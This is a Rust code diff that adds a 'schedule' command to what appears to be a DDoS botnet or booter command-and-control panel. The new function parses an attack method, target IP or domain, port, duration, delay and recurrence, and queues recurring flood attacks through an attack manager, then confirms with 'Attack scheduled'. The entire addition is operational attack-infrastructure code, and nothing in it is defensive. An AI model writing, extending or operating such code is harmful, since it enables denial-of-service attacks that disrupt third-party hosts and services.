@@ -244,3 +244,94 @@ pub async fn handle_queue_command(client: &Arc<Client>, state: &Arc<AppState>) -
     client.write(b"\n\r").await?;
     Ok(())
 }
+
+pub async fn handle_schedule_command(client: &Arc<Client>, state: &Arc<AppState>, parts: &[&str]) -> Result<()> {
+    if parts.len() < 6 {
+        client.write(b"\x1b[38;5;196m[X] Usage: schedule <method> <target> <port> <duration> <offset_secs> [recurrence]\n\r").await?;
+        client.write(b"\x1b[38;5;245mExample: schedule UDP 1.2.3.4 80 60 3600 daily\n\r").await?;
+        return Ok(());
+    }
+    
+    let method_str = match validate_attack_method(parts[1]) {
+        Ok(m) => m,
+        Err(e) => {
+            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
+            return Ok(());
+        }
+    };
+    let target = parts[2].to_string();
+    let port = match validate_port(parts[3]) {
+        Ok(p) => p,
+        Err(e) => {
+            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
+            return Ok(());
+        }
+    };
+    let duration = match validate_duration(parts[4]) {
+        Ok(d) => d,
+        Err(e) => {
+            client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
+            return Ok(());
+        }
+    };
+    let offset_secs = match parts[5].parse::<i64>() {
+        Ok(s) => s,
+        Err(_) => {
+            client.write(b"\x1b[38;5;196m[X] Invalid offset seconds\n\r").await?;
+            return Ok(());
+        }
+    };
+    let recurrence = if parts.len() > 6 {
+        Some(parts[6].to_string())
+    } else {
+        None
+    };
+    
+    let ip = match target.parse::<std::net::IpAddr>() {
+        Ok(ip) => ip,
+        Err(_) => {
+            match tokio::net::lookup_host(format!("{}:{}", target, port)).await {
+                Ok(mut addrs) => {
+                    if let Some(addr) = addrs.next() {
+                        addr.ip()
+                    } else {
+                        client.write(b"\x1b[38;5;196m[X] Could not resolve domain\n\r").await?;
+                        return Ok(());
+                    }
+                }
+                Err(_) => {
+                    client.write(b"\x1b[38;5;196m[X] Invalid IP address or domain\n\r").await?;
+                    return Ok(());
+                }
+            }
+        }
+    };
+    if let Err(e) = check_ip_safety(ip) {
+        client.write(format!("\x1b[38;5;196m[X] {}\n\r", e).as_bytes()).await?;
+        return Ok(());
+    }
+
+    let schedule_time = chrono::Utc::now() + chrono::Duration::seconds(offset_secs);
+    
+    match state.attack_manager.schedule_attack(
+        method_str.clone(),
+        ip,
+        port,
+        duration,
+        client.user.username.clone(),
+        schedule_time,
+        recurrence.clone()
+    ).await {
+        Ok(id) => {
+            let audit_event = AuditLog::new(client.user.username.clone(), "SCHEDULE_AUDIT".to_string(), "SUCCESS".to_string())
+                .with_target(format!("{}:{} (Method: {}, Time: {}, Recurrence: {:?})", target, port, method_str, schedule_time, recurrence));
+            let _ = log_audit_event(audit_event, &state.pool).await;
+            client.write(format!("\x1b[38;5;82m[✓] Attack scheduled (ID: {})\n\rTime: {}\n\rRecurrence: {:?}\n\r", 
+                id, schedule_time, recurrence).as_bytes()).await?;
+        }
+        Err(e) => {
+            client.write(format!("\x1b[38;5;196m[X] Failed to schedule attack: {}\n\r", e).as_bytes()).await?;
+        }
+    }
+    Ok(())
+}
